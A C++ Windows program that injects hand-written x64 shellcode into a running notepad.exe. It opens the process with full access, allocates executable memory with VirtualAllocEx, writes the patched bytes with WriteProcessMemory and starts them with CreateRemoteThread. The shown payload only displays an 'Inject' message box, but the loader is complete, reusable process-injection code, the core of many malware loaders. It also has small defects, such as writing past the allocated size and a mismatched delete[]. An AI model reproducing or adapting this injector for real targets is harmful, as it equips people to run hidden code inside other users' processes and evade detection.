#include <Windows.h>
#include <TlHelp32.h>

#include <iostream>
using namespace std;

unsigned char Shellcode[] = {
   0x48, 0x83, 0xec, 0x28,
   0x48, 0x83, 0xe4, 0xf0,
   0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00,0x00,
   0x49, 0xb8, 0x12, 0x12, 0x12, 0x12, 0x12,
   0x12, 0x12, 0x12,
   0x48, 0xba, 0x23, 0x23, 0x23, 0x23, 0x23,
   0x23, 0x23, 0x23,
   0x45, 0x33, 0xc9,
   0x48, 0xb8, 0x34, 0x34, 0x34, 0x34, 0x34,
   0x34, 0x34, 0x34,
   0xff, 0xd0,
   0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00,
   0x48, 0xb8, 0x45, 0x45, 0x45, 0x45, 0x45,
   0x45, 0x45, 0x45,
   0xff, 0xd0,
   'I', 'n', 'j', 'e', 'c', 't', 0x00,
};

typedef struct _FunctionAddress {
	ULONGLONG MessageBoxAddress;
	ULONGLONG RtlExitUserThreadAddress;
} FunctionAddress, * PFunctionAddress;

class CreateHModule {
	HMODULE _hmodule;
public:
	CreateHModule(LPCWSTR str) { _hmodule = LoadLibraryW(str); }
	~CreateHModule() { FreeLibrary(_hmodule); }

	HMODULE GetHModule() { return this->_hmodule; }
};

bool FindFunctionAddress(PFunctionAddress address) {
	CreateHModule hUser32{ L"user32" };
	address->MessageBoxAddress = reinterpret_cast<ULONGLONG>(GetProcAddress(hUser32.GetHModule(), "MessageBoxA"));
	CreateHModule hNtdll{ L"ntdll" };
	address->RtlExitUserThreadAddress = reinterpret_cast<ULONGLONG>(GetProcAddress(hNtdll.GetHModule(), "RtlExitUserThread"));

	return 0;
}

class CreateHandle {
	HANDLE _handle;
public:
	CreateHandle(HANDLE handle) : _handle{ handle } {}
	~CreateHandle() { CloseHandle(_handle); }

	void SetHandle(HANDLE handle) { this->_handle = handle; }
	HANDLE GetHandle() { return this->_handle; }
};

typedef struct _ProcessThread {
	LPCWSTR ProcessName;
	DWORD dwProcessId{ 0 };
	CreateHandle hProcess{ 0 };
	DWORD dwThreadId{ 0 };
	CreateHandle hThread{ 0 };
} ProcessThread, * PProcessThread;

void NameToProcessId(PProcessThread process) {
	LPPROCESSENTRY32 lppe32 = new PROCESSENTRY32();
	ZeroMemory(lppe32, sizeof(*lppe32));
	lppe32->dwSize = sizeof(*lppe32);

	CreateHandle hSnapshot{ CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, FALSE) };

	if (Process32First(hSnapshot.GetHandle(), lppe32)) {
		do {
			if (lstrcmp(lppe32->szExeFile, process->ProcessName) == 0) {
				process->dwProcessId = lppe32->th32ProcessID;
				break;
			}
		} while (Process32Next(hSnapshot.GetHandle(), lppe32));
	}

	delete[] lppe32;
}

int main() {
	FunctionAddress func_address{ 0 };
	FindFunctionAddress(&func_address);

	ProcessThread target{ 0 };
	target.ProcessName = L"notepad.exe";
	NameToProcessId(&target);
	cout << target.dwProcessId << endl;

	target.hProcess.SetHandle(OpenProcess(PROCESS_ALL_ACCESS, FALSE, target.dwProcessId));
	LPVOID RemoteShellcode = VirtualAllocEx(target.hProcess.GetHandle(), 0, sizeof(Shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	LPVOID RemoteShellcodeAddress = (LPVOID)((DWORD64)RemoteShellcode + 0x100);

	*((ULONGLONG*)&Shellcode[0x11]) = (ULONGLONG)RemoteShellcodeAddress + 0x45;
	*((ULONGLONG*)&Shellcode[0x1b]) = (ULONGLONG)RemoteShellcodeAddress + 0x45;
	*((ULONGLONG*)&Shellcode[0x28]) = func_address.MessageBoxAddress;
	*((ULONGLONG*)&Shellcode[0x3b]) = func_address.RtlExitUserThreadAddress;

	WriteProcessMemory(target.hProcess.GetHandle(), RemoteShellcodeAddress, Shellcode, sizeof(Shellcode), NULL);

	CreateRemoteThread(target.hProcess.GetHandle(), NULL, 0, (LPTHREAD_START_ROUTINE)RemoteShellcodeAddress, NULL, 0, NULL);
}